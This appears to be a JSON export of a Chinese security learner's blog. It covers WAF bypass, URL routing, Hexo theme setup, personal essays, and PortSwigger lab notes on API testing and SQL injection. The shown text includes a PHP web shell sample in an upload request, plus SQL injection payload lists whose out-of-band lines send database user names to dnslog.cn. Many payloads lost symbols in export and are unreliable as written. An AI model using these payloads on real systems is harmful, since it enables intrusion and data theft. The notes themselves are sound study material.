[{"title":"利用HTTP请求格式绕过WAF技术解析","path":"/posts/7de6854f.html","content":"记录从HTTP协议层面绕过WAF的技术，不断总结，活到老学到老~ POST请求中的Content-Type差异applicationx-www-form-urlencoded默认的表单上传格式。 username=adminpassword=123456 multipartform-data在文件上传时，由于文件中可能有各种各样的字符，与常见POST请求参数中的引起冲突，这时引出了一种特有的上传的POST Content-Type格式——multipartform-data。 POST /upload HTTP/1.1Content-Type: multipart/form-data; boundary=----WebKitBoundary------WebKitBoundaryContent-Disposition: form-data; name=usernameadmin------WebKitBoundaryContent-Disposition: form-data; name=file; filename=shell.phpContent-Type: application/x-php?php system($_GET[cmd]); ?------WebKitBoundary-- Content-Type: multipartform-data; boundary—-WebKitBoundary。这里的分界线为—-WebKitBoundary，作用是将上传内容和POST参数数据互不干扰。 两个分界线之间的内容，有些是POST 数据，有些是上传文件，区分主要在于是否有“filename”字样。 如何将标准POST请求转换为multipartform-data格式提交呢？Burp的右键方便的提供这个功能，点击Change boby encoding，就可以实现了。 转换后如图。 利用其绕过WAF解析： 部分 WAF 默认优先检测 application/x-www-form-urlencoded 或 JSON 请求，但对 multipart/form-data 的解析不完善（如未正确提取字段名和值）。 利用 Content-Disposition 的额外属性（如 filename=）干扰 WAF 的正则匹配。 --boundaryContent-Disposition: form-data; name=user; filename=a.txtContent-Type: text/plain OR 1=1 --这里 filename 可能误导 WAF 认为这是一个文件字段而非SQL 注入。 分块传输Transfer-Encoding: chunked 是 HTTP1.1 中定义的一种 数据传输机制，允许服务端客户端分段（Chunk）发送数据，不需要预先知道整体内容的长度（即无需设置 Content-Length）。 看视频时，往往是边观看边下载的，这时候HTTP响应就是用的分块传输的形式，先发送一部分数据到服务器，然后再发送后续的内容，这种形式被称为chunked。 特点： HTTP2.0提供了比分块传输更有效的数据流机制，并禁止使用标头。（HTTP2.0不支持使用HTTP标头的分块传输） chunked分块可以一次性发送，也可以切分多次后发送 增加了头部 Transfer-Encoding: chunked，另外16进制声明长度。 可以使用这个插件构造分块传输： http://github.com/c0ny1/chunked-coding-converter 思考：如果有一个注入可以分块绕过，但是需要拿数据手工很麻烦，怎么办？SQLMAP怎么使用分块传输啊？ 答：可以使用插件自带的代理功能。 可参考文章：https://mp.weixin.qq.com/s/pM1ULCqNdQwSB7hcltrbtw","tags":["WEB安全","WAF"],"categories":["WEB安全","WAF绕过"]},{"title":"Web URL 路由解析机制详解","path":"/posts/dde44b6c.html","content":"在重塑自己的安全技能时，发现自己对Web URL 路由解析机制还是有些模糊，因此探究学习一番。 常见的Web URL 路由解析机制总结如下。 基于文件目录 原理：URL 路径直接映射服务器物理文件路径。 区分： admin 表示访问的是 admin 目录，会访问 admin 目录下的索引文件。 admin 表示访问的是 admin 文件，如果没有这个文件，就返回 404。 适用场景：静态网站、传统 PHPHTML 项目。 局限：灵活性低，难以处理动态逻辑或隐藏实际文件路径。安全性低，容易暴露目录结构。 基于路由 原理：URL 路径由框架的路由机制解析，映射到处理函数或控制器，与物理路径无关。 两种子类型： 后端路由（ 如 Express (Node.js), Django (Python), Spring MVC (Java), Laravel (PHP) ） 特点：服务器端渲染 (SSR) 或 API 接口，处理业务逻辑，返回 HTMLJSONXML。 https://api.example.com/users/123- Express.js app.get(/users/:id, userController.getUser) 前端路由（ React Router, Vue Router, Angular Router。 ）： 特点：单页应用 (SPA) 核心，无刷新切换视图，URL 与 UI 状态同步。 模式：Hash 模式 (#/profile), History 模式 (/profile)。 https://app.example.com/profile - React Router Route path=/profile element=ProfilePage/ 适用场景：动态网站、Web 应用、API 服务、SPA。 混合模式 原理：结合文件目录约定和路由定义，通常用于全栈框架，实现“约定优于配置”。文件位置自动映射为路由。 Next.js (React)：/pages/index.js - //pages/about.js - /about/pages/api/data.js - /api/data (API路由)/pages/blog/[slug].js - /blog/hello-world (动态路由) 适用场景：需要快速开发、兼顾前后端逻辑、支持多种渲染模式（SSR, SSG, CSR）的现代 Web 应用。 ​\t思考：访问 www.baidu.com/index.php 成功就可以断定百度是 php 写的吗？所以百度的首页是 idnex.php 吗？ ​\t不是的，百度后端只是绑定 index.php 路由到某个返回结果上，不能访问 index.php 成功就认为这个文件存在。所见非真！ 虚拟路径 原理：URL 路径是“虚构”的，不代表真实文件位置。服务器端逻辑根据路径参数动态生成或获取资源。 URL 示例： 网易云音乐：https://music.163.com/song/media/outer/url?id=1867217766.mp3 (服务器根据 id 从数据库CDN 获取音频流) YouTube 视频：https://www.youtube.com/watch?v=dQw4w9WgXcQ (服务器根据 v 参数查找视频流) 动态图片生成：https://example.com/chart?type=bardata=[1,2,3] (服务器动态生成图表图片) 适用场景：媒体流服务（音乐视频）、动态生成内容（图表、报告）、需要权限控制的资源、CDN 入口、短链接服务、API 网关路由。 RESTful API 资源 原理：URL 代表资源本身，HTTP 方法 (GET, POST, PUT, DELETE) 代表对资源的操作。URL 结构通常设计为名词复数形式。 URL 示例： GET /api/users - 获取用户列表 GET /api/users/123 - 获取 ID 为 123 的用户 POST /api/users - 创建新用户 PUT /api/users/123 - 更新用户 123 DELETE /api/users/123 - 删除用户 123 适用场景：构建 Web API 服务，供前端或其他系统消费数据。是现代前后端分离架构的核心。 GraphQL 单一端点 原理：所有请求都发送到同一个端点 (通常是 /graphql)。客户端通过查询语句精确指定需要的数据结构和字段。 请求示例： 请求：POST /graphql query: ` query user(id: 123) name email posts(limit: 5) title createdAt `响应： data: user: name: Alice, email: alice@example.com, posts: [ title: First Post, createdAt: 2023-10-25, ... ]","tags":["WEB安全"],"categories":["WEB安全","基础知识"]},{"title":"stellar博客主题配置及踩坑记录","path":"/posts/48181fae.html","content":"捣鼓了一下博客，记录了一些配置踩坑记录~ HEXO 命令hexo new My New Posthexo cleanhexo generatehexo serverhexo deploy stellar 理念真正的简约远不止删繁就简，而是在纷繁中建立秩序。 降低视觉密度 提高有效信息优先级 删掉无效信息 安装打开终端并进入博客文件夹，执行：npm i hexo-theme-stellar在 blog/_config.yml 文件中找到并修改：theme: stellar 文章类型tech: 默认技术类文章, story: 图文类文章（文字和段落间增距大）blog/_config.stellar.ymlarticle: type: tech # tech/story 站点信息配置_config.yml 主题配置文件在博客根目录的 _config.yml 文件旁边新建一个文件： _config.stellar.yml ，在这个文件中的配置信息优先级高于主题文件夹中的配置文件。将主题的配置文件复制到根目录下 自动生成封面blog/_config.stellar.ymlarticle: auto_cover: true 引用外部图片在文章的 front-matter 中写上 cover: xxx 即可。例如：---# 本地图片路径为 blog/source/assets/xaoxuu/blog/2020-0927a@1x.svg# 也可以直接引用图片直链 https://xxx.jpgcover: /assets/xaoxuu/blog/2020-0927a@1x.svg--- 自动生成摘要blog/_config.stellar.ymlarticle: auto_excerpt: 200 Fonthttps://github.com/xaoxuu/hexo-theme-stellar-examples/blob/main/blog/_config.stellar.yml inject: head: - link rel=apple-touch-icon sizes=180x180 href=/assets/xaoxuu/favicon/apple-touch-icon.png - link rel=icon type=image/png sizes=32x32 href=/assets/xaoxuu/favicon/favicon-32x32.png - link rel=icon type=image/png sizes=16x16 href=/assets/xaoxuu/favicon/favicon-16x16.png - link rel=manifest href=/assets/xaoxuu/favicon/site.webmanifest - link rel=shortcut icon href=/assets/xaoxuu/favicon/favicon.ico - meta name=theme-color content=#f8f8f8 - link rel=stylesheet href=https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css media=all / style: text-align: justify smooth_scroll: false codeblock: scrollbar: 0px font-size: body: 1rem font-family: logo: LXGW WenKai Screen, system-ui, Microsoft Yahei, Segoe UI, -apple-system, Roboto, Ubuntu, Helvetica Neue, Arial, WenQuanYi Micro Hei, sans-serif body: LXGW WenKai Screen, system-ui, Microsoft Yahei, Segoe UI, -apple-system, Roboto, Ubuntu, Helvetica Neue, Arial, WenQuanYi Micro Hei, sans-serif code: LXGW WenKai Screen, Menlo, Monaco, Consolas, system-ui, Courier New, monospace, sans-serif codeblock: Menlo, Monaco, Consolas, system-ui, Courier New, monospace, sans-serif 文章模板根目录下 scaffolds 文件夹中编辑 post.md 的 font-matter ，根据自己的需要增加你想要配置的内容 ---# 基本信息title: title date: date tags: []categories: []description: # excerpt 也可 # 封面cover: banner: poster: # 海报（可选，全图封面卡片） topic: 标题上方的小字 # 可选 headline: 大标题 # 必选 caption: 标题下方的小字 # 可选 color: 标题颜色 # 可选# 插件sticky: # 数字越大越靠前mermaid:katex: mathjax: # 可选topic: # 专栏 idauthor: references:comments: # 设置 false 禁止评论indexing: # 设置 false 避免被搜索breadcrumb: # 设置 false 隐藏面包屑导航leftbar: rightbar:h1: # 设置为 隐藏标题type: # tech/story--- 文章如果有分类和标签就会自动在主页出现「分类」、「标签」选项卡实现分类浏览，不需要手动添加页面。 文章页横幅图片blog/source/_posts/xxx.mdbanner: /assets/xaoxuu/blog/2020-0927a@1x.svg 指定一级标题默认的一级标题是文章的 title，如果希望使用别的文字作为一级标题，可以指定 h1，例如： blog/source/_posts/xxx.md---h1: 快速开始--- 文章分类文章如果有分类和标签就会自动在主页出现「分类」、「标签」选项卡实现分类浏览，不需要手动添加页面。 在文章列表页面会显示文章所属的第一级分类，例如： blog/source/_posts/xxx.md---categories: [设计开发, iOS开发]--- 这样写就只会显示「设计开发」一级分类，而在文章页面顶部则会显示完整的面包屑导航。 更多独立页面为了能够正确进行导航栏高亮，引入了 menu_id 来进行区分，可以在 front-matter 中指定 menu_id 来使某个菜单按钮处于选中状态。 例如您有关于、友链两个页面，都希望高亮「更多」按钮： blogsourceaboutindex.md ---menu_id: moretitle: 关于--- blogsourcefriendsindex.md ---menu_id: moretitle: 友链--- blog_config.stellar.yml menubar: columns: 4 # 一行多少个 items: # 可按照自己需求增加，符合以下格式即可 ... - id: more theme: title: 更多 icon: url: /more/ 组件库文章文档的目录树组件，显示文章和文档的目录结构： 在 wiki 板块显示的是最近更新的 wiki 页面，其余地方显示最近更新的文章。 toc: layout: toc list_number: false # 是否显示序号 min_depth: 2 # 建议不要低于 2 即从 H2 标签开始解析（H1标签用于文章大标题） max_depth: 5 # 5 代表最多解析到 H5 标签 fallback: recent # Use a backup widget when toc does not exist. collapse: false # true / false / auto (始终折叠/不折叠/自动折叠)recent: layout: recent rss: # /atom.xml # npm i hexo-generator-feed limit: 5 # Count of posts 侧边栏设置logo: subtitle: ‘’ # ‘文字 1 | 文字 2’ (鼠标放上去会切换到文字 2) Navbar（主导航栏）自己可以增加任意的键值对，键：就是 menu_id，后面需要用到，值：就是显示的 md 链接，方括号内支持文字和图片标签 侧边栏欢迎语 在主题文件目录下的_datawidgets.yml 文件中新增一项侧边栏配置，写下你的网站欢迎语. 可以引用开放接口，如【今日诗词】. welcome: layout: markdown title: 🎉 欢迎 content: | 本站托管于 Github, 可能会出现加载缓慢或丢失问题，欢迎在评论区交流技术知识。 br hr 今日诗词: span id=jinrishici-sentence /span script src=https://sdk.jinrishici.com/v2/browser/jinrishici.js charset=utf-8 /script 修改主题配置_config.stellar.yml，设置欢迎语出现的具体位置 widgets: #### 自动生成的页面 #### # 主页 home: search, welcome, recent, tagcloud, timeline # for home 永久链接软件npm install hexo-abbrlink --save 标签颜色配置文件 article: category_color: 探索号: #f44336 # 博客搭建: #4CB9E7 # Hexo: #FF004D # ChatGPT: #43766C # 绘画: #11009E # 前端: #F08A5D 本站由 @{author.name} 使用 {theme.name} {theme.version} 主题创建。 底部配置文件的 style 里的 content content: | # 支持 Markdown 格式 center 本站由 @a href=/strongauthor.name/strong/a 使用 a href=theme.treetheme.name theme.version/a 主题创建。 /center center /br /br script type=text/javascript function show_runtime() window.setTimeout(show_runtime(), 1000); X = new Date(2025/03/25 00:00:00 ); Y = new Date(); T = (Y.getTime() - X.getTime()); M = 24 * 60 * 60 * 1000; a = T / M; A = Math.floor(a); b = (a - A) * 24; B = Math.floor(b); c = (b - B) * 60; C = Math.floor((b - B) * 60); D = Math.floor((c - C) * 60); runtime_span.innerHTML = 🌱 营业 + A + 天- + B + 小时- + C + 分- + D + 秒 🛞 show_runtime(); /script span id=runtime_span /span center WIKIhttps://xaoxuu.com/wiki/stellar/wiki-settings/ 新建 blogsource_data，并新建 wiki 文件夹，在 wiki 下新建自己的项目文件夹。 _data 下面的 wiki 是用来做配置的，不是放文件的。 blog/source/_data/wiki/项目名.ymlname: WebSectitle: Web安全subtitle: Web安全 | 没有绝对安全的系统# tags:# icon: /assets/wiki/stellar/icon.svg# cover: /assets/wiki/stellar/icon.svgdescription: 对于Web安全漏洞原理及挖掘手法进行总结，以便于自己查阅。# repo: xaoxuu/hexo-theme-stellarsearch: filter: /wiki/WebSec/ placeholder: 在 WebSec中搜索...leftbar: - tree - timeline_stellar_releases - related# comment_title: 评论区仅供交流，有问题请提 [issue](https://github.com/xaoxuu/hexo-theme-stellar/issues) 反馈。# comments:# service: giscus# giscus:# data-repo: xaoxuu/hexo-theme-stellar# data-mapping: number# data-term: 226base_dir: /wiki/WebSec/tree: 开始: - API测试 # - releases # 使用: # - bbb # - pages # - sidebar # - tag-plugins # - tag-plugins/express # - tag-plugins/data # - tag-plugins/container # - comments # 文档系统: # - wiki-settings # 进阶玩法: # - widgets # - advanced-settings # - notes # - fcircle # 技术支持: # - articles # - todo # - contributors 在此文档项目的 md 文件的 front-matter 部分指定所属的项目名（即上一步创建的文件名 项目名.yml） ---wiki: id # 这是项目id，对应 /data/wiki/id.ymltitle: 这是分页标题--- 在 blog/source/_data/ 文件夹中创建一个 wiki.yml 文件，在其中写入需要显示的项目 id： - id- 其它项目 NOTEhttps://xaoxuu.com/wiki/stellar/wiki-settings/notes.html OKR 目标管理https://xaoxuu.com/wiki/stellar/tag-plugins/express/#okr-%E7%9B%AE%E6%A0%87%E7%AE%A1%E7%90%86 背景颜色blog_config.stellar.yml 文件中， style: leftbar: # 可以设置：纯色/渐变色/图片作为背景 # background: var(--leftbar-bg) background-image: url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.13/image/sidebar-bg1@small.jpg) blur-px: 100px blur-bg: var(--alpha60) 该网站有很多好看的颜色，复制修改即可。(https://webgradients.com/) recent在小王随笔页面我不希望有 recent，在 datawidgets.yaml 中将 recent 组件置空，自己新建一个组件 recent: # layout: recent # rss: # /atom.xml # npm i hexo-generator-feed # limit: 5 # Count of postsmy_recent: layout: recent # rss: # /atom.xml # npm i hexo-generator-feed limit: 5 # Count of posts 并在配置文件中修改，在需要的位置添加 my_recent 组件。 site_tree:\thome: leftbar: welcome, recent, my_recent 网易云音乐组件去网易云找到歌曲 id，例如：https://music.163.com/#/song?id 524152312 在 mardown 中写入 Your browser does not support the audio tag. 就可以了，参考 此页面 的网易云音乐组件就是这样写的。 表达类标签自动补齐参考文章： https://blog.hzchu.top/2024/%E4%BD%BF%E7%94%A8Typora-plugin%E5%A2%9E%E5%BC%BAStellar%E5%86%99%E4%BD%9C%E4%BD%93%E9%AA%8C/ hexo草稿参考文章： https://hexo.io/zh-cn/docs/writing 新建：hexo new draft title使用此布局初始化的帖子将被保存到 source/_drafts 文件夹中。 您可以使用 publish 命令将草稿移动到 source/_posts 文件夹。预览：hexo S --draft发布：hexo publish title","tags":["Blog"],"categories":["Blog"]},{"title":"年华就该是温润、流动，但只能缓缓向前","path":"/notes/缓缓向前.html","content":"我似乎看到多年以后，你站在一扇蓝色大门前，你笑着，我跑向你。三年、五年以后，甚至更久更久以后，我们会变成什么样的大人呢？我闭着眼睛也看不见自己，但是，我却可以看见你。 ——《蓝色大门》 Hi, Dear Meng. 现在是北京时间的凌晨三点，我夜不能寐，想与你聊聊心中所感，便起床写了这封信。 站在快二十三岁的节点回望，十八岁后的五年里，日子缓慢，简单散漫自由的校园生活，充斥着过一日是一日的快乐。这些日子里你成长了些许，也经历了不少，走过了一个个的岔路口，反复向自己问询人生的答案。 我究竟向往的是什么？人生的意义是什么？努力真的有用吗？我会不会很差劲很笨？为什么我总是坚持不下来？真的一辈子要做这一行嘛？ 在很多个躺在床上睡不着的夜晚里，你有很多问题找不到答案。 你有很多想法，一些灵机一动的创业 idea。有很多想去的地方，冰岛、大理、威海、海南等，王阳明先生的龙场，鲁迅先生的三味书屋等等。有很多想看的书，想看的电影和剧、想发展艺术、想去国外留学。 你对未来的生活充满了很多幻想，但生活充满了不定性，对父母日渐苍老的恐慌，对工作或读研的焦虑，夹杂着一事无成的迷茫。 也好在你还有很多无条件永远支持你的人，家人，老师，好朋友。好在你经常自省，如果用《夏日重现》里的话说就是俯瞰自己。也好在你才二十二岁，还年轻，有激情。 要知道我们从来都不是为了谁而活着，所以请尽情地、努力地、真实地去做那个你心目中的自己。有挫折是为了让你变强，有冷眼嘲笑也没什么大不了，静下心来去做自己的事情好了。 就像你喜欢的朋友圈仅自己可见的那句话说的： 无人问津也好，技不如人也罢，你要试着安静下来，去做自己该做的事，而不是让内心烦躁、焦虑，毁掉你本就不多的热情和定力。 你最近还偶尔熬夜刷了一些剧，《Breaking Bad》、《Better Call Saul》等。老白和吉米的故事很吸引你，有时候也会想： 如果知道自己的人生只剩下那么两年，你会做什么？生命真的很长吗？ 我们日复一日地度过自己的人生，有时争分夺秒，有时却又大手挥霍。我们又有多少时间呢？ 认真地想了这个问题，于是你算了算。 假设活到 60 岁，你剩下 37 年，13505 天。 如果每天当作一局游戏的话，你只剩下一万多局。 每天睡眠、吃饭、洗澡花费 10 小时，你真正拥有属于自己的时间只有 7877 天。 你有很多目标想在 28 岁之前实现的，1825 天的时间，计算下来，时间真的好少。成为专家需要一万个小时，每天学习 10 小时，至少得坚持三年。坚持，简单两个字，却是难以坚持。 但时间本就不应该被这么精打细算吧？这样活得不自由、也不快乐。 谈到太远大、难以实现的目标，总是让人心生惧怕，不想面对。 在学校里跑步的时候，你信誓旦旦地和舍友说自己今天要跑 5 公里不停，可是一想到五公里要在操场上跑 12.5 圈，你便犹豫了。 “天啊，持续跑 5 圈已经很累了好吗！”，于是那天你没去。 但你是一个喜欢和自己较劲的人。第二天，你看到 跑 5 公里需要 35 分钟左右，你很质疑。于是你决定试试。 你看着手表，一公里、二公里、三点八公里、四点六公里，心里想着再多跑两圈就好了。最终你一身汗跑完了 5.03KM，花了 32 分 13 秒。中途有三四次想放弃，但你没有停下来。 其实你都明白，很多目标和跑步一样，做好规划，知行合一，一步一个脚印，一定会好的。 如阳明先生所说：“吾心自有光明月，千古团圆永无缺。” 知是行之始，行是知之成。 做到心中无愧，知行合一就很好了。 当然，对于未来也不必太过焦虑。 仔细想想，最初的梦想和初衷都还在，距离它，是不是更近了一些呢？ 好像是的。 你很喜欢 UP 主 小鹿采访乌镇和黄磊的最新一期结尾里看着被风吹拂的湖面说的那句话： 年华就该是温润、流动，但只能缓缓向前。 你想起了四年前和好友去杭州游玩时看到的西湖湖面。想必在没有见面的日子里，大家也都在温润地、流动地、缓缓向前。 最后送你一句话吧，来自《绝命毒师》剧场版的结尾，小粉和 Jane 的对话： “I’ve gone where the universe takes me my whole life, It’s better to make those decisions for yourself.” “在浩瀚的宇宙中随波逐流，不如追寻你的心之所向。 希望你越来越好的自己 2022.12.15"},{"path":"/notes/index.html","content":"欢迎来到《小王随笔》“生活褶皱里的灵感标本，不定期更新。“ 更新频率: 薛定谔式内容密度: 50%干货 + 50%碎碎念安全等级: [需咖啡因解密] O1 2025年的小目标：SRC 正常 10% KR1 重构 安全技能 和 wiki 知识库 完成portswigger靶场并融合之前所学转化为checklist通过CISP-PTE考试重塑php&python，掌握基本php代码审计和python工具开发。完善web安全知识库，并基本完善其余JAVA安全/工具开发/内网渗透等知识库 正常 10% KR2 对各大SRC进行漏洞挖掘赚取赏金 正常 10%"},{"title":"API测试","path":"/wiki/WebSec/API测试.html","content":"API安全测试API基础文章：https://aws.amazon.com/what-is/api/ API文章 - GraphQL与RESTful：WebAPI时代的攻击面 - 先知社区 文章 - API安全学习笔记 - 先知社区 OWASPcrAPI: completely ridiculous API (crAPI) 漏洞挖掘1、发现API （api文档、递归爆破），查找隐藏的API，隐藏的参数。 2、支持的不同的HTTP请求方法 http verbs可以爆破。 大规模分配漏洞大规模分配（也称为自动绑定）可以无意间创建隐藏的参数。当软件框架自动将请求参数绑定到内部对象上的字段时，就会发生。因此，大规模分配可能会导致应用程序支持参数，这些参数从未打算由开发人员处理。 预防API中的漏洞Burp靶场lab1Lab: Exploiting an API endpoint using documentation step: 修改邮箱，发现了PATCH apiuserwiener可疑的接口 尝试找到api文档，GET api HTTP2，找到API文档，进行删除DELETE apiusercarlos。 总结：每个功能点都进行尝试，找到可疑的接口数据包，进行进一步分析。 lab2Lab: Finding and exploiting an unused API endpoint step: 对GET apiproducts1price 进行测试所支持的请求方法 发现其支持PATCH，根据提示，只支持JSON格式。 修改content-type: applicationjson，并添加一个空的json请求体。 根据提示构造参数，完成价格修改。回到购买页面，购买商品。 总结：对于可疑API可以进行测试所支持的请求方法，再根据提示构造参数。 lab3Testing mass assignment vulnerabilities测试大规模分配漏洞（自动绑定漏洞） Lab: Exploiting a mass assignment vulnerability https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability step: 进行买夹克，发现最最后的接口是apicheck 在GET请求中，对比POST请求多了一个参数，添加进行，修改值为x，发现参数被接收，修改百分比为100，导致价格为0。成功购买商品。 {“chosen_discount”:{“percentage”:100},”chosen_products”:[{“product_id”:”1”,”quantity”:1}]} 总结：对于API的不同请求方法的响应包，请求包参数需要敏感一些，尝试添加在请求中，更改数值查看响应，若参数被接收，那么就基本存在自动绑定漏洞的。"},{"title":"About Me","path":"/about/index.html","content":"👋 Hi, I’m M3ng9e. 👀 I’m interested in Cyberspace Security. 💻 Web security Red team Bug bounty hunter 🌱 凌驭空间·OverSpace 🏠 Blog：https://m3ng9e.github.io/ 🆒 王权之势寻苍穹，萌蘖向阳成参天。 💽 Music Movies"},{"title":"Web URL 路由解析机制详解","path":"/wiki/WebSec/Web URL 路由解析机制详解.html","content":"常见的Web URL 路由解析机制总结如下。 基于文件目录 原理：URL 路径直接映射服务器物理文件路径。 区分： admin 表示访问的是 admin 目录，会访问 admin 目录下的索引文件。 admin 表示访问的是 admin 文件，如果没有这个文件，就返回 404。 适用场景：静态网站、传统 PHPHTML 项目。 局限：灵活性低，难以处理动态逻辑或隐藏实际文件路径。安全性低，容易暴露目录结构。 基于路由 原理：URL 路径由框架的路由机制解析，映射到处理函数或控制器，与物理路径无关。 两种子类型： 后端路由（ 如 Express (Node.js), Django (Python), Spring MVC (Java), Laravel (PHP) ） 特点：服务器端渲染 (SSR) 或 API 接口，处理业务逻辑，返回 HTMLJSONXML。 https://api.example.com/users/123- Express.js app.get(/users/:id, userController.getUser) 前端路由（ React Router, Vue Router, Angular Router。 ）： 特点：单页应用 (SPA) 核心，无刷新切换视图，URL 与 UI 状态同步。 模式：Hash 模式 (#/profile), History 模式 (/profile)。 https://app.example.com/profile - React Router Route path=/profile element=ProfilePage/ 适用场景：动态网站、Web 应用、API 服务、SPA。 混合模式 原理：结合文件目录约定和路由定义，通常用于全栈框架，实现“约定优于配置”。文件位置自动映射为路由。 Next.js (React)：/pages/index.js - //pages/about.js - /about/pages/api/data.js - /api/data (API路由)/pages/blog/[slug].js - /blog/hello-world (动态路由) 适用场景：需要快速开发、兼顾前后端逻辑、支持多种渲染模式（SSR, SSG, CSR）的现代 Web 应用。 ​\t思考：访问 www.baidu.com/index.php 成功就可以断定百度是 php 写的吗？所以百度的首页是 idnex.php 吗？ ​\t不是的，百度后端只是绑定 index.php 路由到某个返回结果上，不能访问 index.php 成功就认为这个文件存在。所见非真！ 虚拟路径 原理：URL 路径是“虚构”的，不代表真实文件位置。服务器端逻辑根据路径参数动态生成或获取资源。 URL 示例： 网易云音乐：https://music.163.com/song/media/outer/url?id=1867217766.mp3 (服务器根据 id 从数据库CDN 获取音频流) YouTube 视频：https://www.youtube.com/watch?v=dQw4w9WgXcQ (服务器根据 v 参数查找视频流) 动态图片生成：https://example.com/chart?type=bardata=[1,2,3] (服务器动态生成图表图片) 适用场景：媒体流服务（音乐视频）、动态生成内容（图表、报告）、需要权限控制的资源、CDN 入口、短链接服务、API 网关路由。 RESTful API 资源 原理：URL 代表资源本身，HTTP 方法 (GET, POST, PUT, DELETE) 代表对资源的操作。URL 结构通常设计为名词复数形式。 URL 示例： GET /api/users - 获取用户列表 GET /api/users/123 - 获取 ID 为 123 的用户 POST /api/users - 创建新用户 PUT /api/users/123 - 更新用户 123 DELETE /api/users/123 - 删除用户 123 适用场景：构建 Web API 服务，供前端或其他系统消费数据。是现代前后端分离架构的核心。 GraphQL 单一端点 原理：所有请求都发送到同一个端点 (通常是 /graphql)。客户端通过查询语句精确指定需要的数据结构和字段。 请求示例： 请求：POST /graphql query: ` query user(id: 123) name email posts(limit: 5) title createdAt `响应： data: user: name: Alice, email: alice@example.com, posts: [ title: First Post, createdAt: 2023-10-25, ... ]"},{"title":"SQL注入基础","path":"/wiki/WebSec/SQL注入基础.html","content":"什么是SQL注入？如何理解SQL注入？SQL注入其实是一个组合名词，SQL、注入，想理解SQL注入的含义，就应该先明白SQL是什么？注入是什么？ SQL是什么？SQL是结构化查询语言(Structured Query Language)的简称，一种用于管理和操作关系型数据库的标准语言。 通俗的讲，是一种可以在电子表格里进行想要的筛选、操作和管理数据的一种标准语言。 注入是什么？注入攻击（Injection） 在安全领域指的是将恶意代码或数据插入到原本的程序逻辑中，导致意想不到的行为，叫做注入攻击。 通俗的讲，想象医生打针给你注入了不对的东西，导致你的人体系统平衡被破坏了。 什么是SQL注入？简而言之，SQL注入漏洞就是通过注入攻击破坏了原有的SQL逻辑，导致攻击者可以实现对数据库甚至服务器的非法操作。 如何检测SQL注入？通常在参数后加一个单引号查找错误和异常，再加入布尔条件and 11 and 12寻找差异，或者时间延迟寻找差异、OAST(Out-of-band application security testing (OAST)) payload。 注意：检测时使用or 11需要格外的小心，因为在update或者delete语句中，会导致数据丢失。 【数字型】-151-ASCII(1) # 这个表达式的值等于267-ASCII(A) # 这个表达式的值等于2【明显错误】`))`)))))`))【布尔盲注】or 1=1--+ or 1=1--+ or 1=1--+` or 1=1--+) or 1=1--+) or 1=1--+`) or 1=1--+)) or 1=1--+)) or 1=1--+`)) or 1=1--+like a=a【时间盲注】MySQL1 and sleep(10)1 sleep(10)PostgreSQL1 || pg_sleep(10)MySQL1 WAITFOR DELAY 0:0:10【带外盲注】 不同类型的SQL注入技术？联合查询注入报错注入布尔盲注时间盲注堆叠注入带外注入SQL注入的发生场景只要参数可控并代入了数据库查询，就可能存在SQL注入漏洞。 推荐阅读：https://mp.weixin.qq.com/s/l2Bt9jv-96HapqxYfeju2w?scene=25#wechat_redirect 楼兰师傅讲的真的很好~ 文件参数、时间参数、自动绑定参数、restapi等等都可能存在注入。 SQL注入的利用方式检索隐藏数据 or 11https://insecure-website.com/products?category=Gifts+OR+1=1-- 颠覆应用逻辑 万能密码SELECT * FROM users WHERE username = wiener AND password = bluecheese 检索数据联合查询 确认列数 使用NULL判断数据库类型 判断字段类型，检索数据。 所有数据库都需要判断有用的字段类型，无论是什么数据库，判断字段类型的方法基本相同。 使用 NULL 测试： NULL 可以匹配任何类型。 示例： UNION SELECT NULL, NULL, NULL 逐步替换 NULL： 将 NULL 替换为数字或字符，观察是否报错。 示例： 如果字段类型不匹配，数据库会返回明确的错误信息。 UNION SELECT 1, a, NULL 报错注入通过故意触发数据库错误，在错误信息中返回敏感数据 # MySQL AND updatexml(1,concat(0x7e,(SELECT user()),1)-- # PostgreSQL OR CAST((SELECT current_user) AS INTEGER)-- # MSSQL AND 1=convert(int,(SELECT @@version))-- 盲注所谓盲注，就是无显式错误数据回显，通过间接方式判断注入结果。 布尔盲注通过页面响应状态差异判断逻辑真假 # 基础探测 AND 1=1 -- 正常 AND 1=2 -- 异常# 数据提取 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)=a-- # 二进制逐位判断 AND ASCII(SUBSTRING((SELECT @@version),1,1))80-- 时间盲注通过人为制造响应延迟判断注入结果 # MySQL AND IF(ASCII(SUBSTRING((SELECT user()),1,1))=114, SLEEP(3), 0)-- # PostgreSQL AND CASE WHEN (ASCII(SUBSTRING(version(),1,1))100) THEN pg_sleep(3) ELSE NULL END-- # MSSQL; IF (SELECT COUNT(*) FROM sysobjects)0 WAITFOR DELAY 0:0:5-- OAST带外盲注通过数据库发起外部网络请求传递数据 # MySQL (需FILE权限) UNION SELECT LOAD_FILE(CONCAT(\\\\\\\\,(SELECT HEX(user())),.dnslog.cn\\\\test))-- # MSSQL; EXEC master..xp_dirtree \\\\+ (SELECT TOP 1 name FROM sys.databases) +.dnslog.cn\\-- # Oracle||UTL_INADDR.GET_HOST_NAME((SELECT user FROM DUAL)||.dnslog.cn)-- 不同数据库SQL注入的利用由于篇幅过长，我会单独发布在WEB-SQL注入的分类中。 SQL注入的绕过SQL注入的防御SQL注入靶场Lab1Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data step: 加单引号，发现异常 Gifts’ or 11–+（因为 1=1 是一个恒真条件，导致整个 WHERE 条件永远为真。数据库不会过滤任何行，而是返回表中的所有数据。） Gifts’ or 12–+ （如果 id = 1 为真，那么整个条件为真，该行会被选中。如果 id = 1 为假，那么由于 1=2 也为假，整个条件为假，该行不会被选中。最终，数据库只会返回 id = 1 的行。） Lab2Lab:SQL injection vulnerability allowing login bypass https://portswigger.net/web-security/sql-injection/lab-login-bypass step: 账号administrator’– 密码随便输入（猜想where username’administrator’ and password’123456’ –+） Lab3Lab: SQL injection attack, querying the database type and version on Oracle https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle step: Accessories’ or 11–+，Accessories’ or 12–+ 找到闭合 Accessories’ order by 2–+，Accessories’ order by 3–+ 只有两个字段 